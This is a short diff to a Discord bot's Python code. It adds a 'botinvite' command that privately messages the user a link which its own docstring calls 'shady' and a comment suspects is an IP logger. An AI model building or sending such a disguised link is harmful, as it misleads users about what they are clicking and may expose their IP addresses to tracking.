@@ -65,6 +65,12 @@ async def github(ctx):
     """links to github repository"""
     await ctx.send("https://github.com/jsinitx4/content")
 
+@client.command()
+async def botinvite(ctx):
+    """sends you a shady link"""
+    await ctx.author.send("https://speed-is-a.living-me.me/s/gaqo") # is this an ip logger?
+    await ctx.send("check your dms thanks")
+
 @client.command(hidden=True)
 @commands.check(is_owner)
 async def shutdown(ctx):
